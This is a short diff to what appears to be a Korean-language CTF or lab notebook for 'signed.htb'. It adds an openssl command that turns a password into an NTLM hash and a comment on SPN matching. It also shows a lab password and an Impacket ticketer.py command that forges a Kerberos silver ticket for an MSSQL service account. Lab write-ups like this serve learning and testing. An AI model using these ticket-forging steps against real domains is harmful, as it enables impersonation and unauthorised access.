@@ -983,8 +983,10 @@ gpupdate /force
 
 ```bash
 # password to hash
+echo -n <password> | iconv -t utf-16le | openssl md4 -provider legacy
 python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
 
+# SPN을 필수로 입력해 줘야하지만 완전히 일치하지 않아도 됨.
 ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
 ```
   
